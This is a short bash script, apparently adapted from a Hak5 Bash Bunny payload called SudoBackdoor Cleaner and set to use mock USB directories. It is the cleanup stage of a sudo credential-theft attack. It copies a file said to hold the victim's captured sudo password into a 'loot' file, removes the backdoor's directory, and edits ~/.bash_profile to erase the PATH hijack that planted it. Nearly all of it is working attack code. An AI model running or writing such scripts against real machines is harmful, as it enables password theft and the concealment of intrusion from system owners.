#!/bin/bash

# inspired by: https://github.com/hak5/bashbunny-payloads/blob/27d63ad5a535510b20787cc03850b28bbdb727ee/payloads/library/credentials/SudoBackdoor/cleaner/payload.txt

# Title:     SudoBackdoor{Cleaner}
# Author:    oXis
# Target:    Mac/Linux
# Version:   0.1
#
# Get back the password grabbed by the
# sudo backdoor and do cleanup
#
# White            |  Ready
# Blue blinking    |  Attacking
# Green            |  Finished

MOCK_BASH_BUNNY_USB_DIR=$HOME/bash_bunny
PAYLOAD_DIR=$MOCK_BASH_BUNNY_USB_DIR/payloads/SudoBackdoor/injector
LOOT_DIR=$MOCK_BASH_BUNNY_USB_DIR/loot/SudoBackdoor
LOOT_FILE=$LOOT_DIR/loot.txt
mkdir -p $MOCK_BASH_BUNNY_USB_DIR $PAYLOAD_DIR $LOOT_DIR

cp ~/.config/sudo/sudo.config $LOOT_FILE

rm -rf ~/.config/sudo && sed -i 's/~\/\.config\/sudo://g' ~/.bash_profile
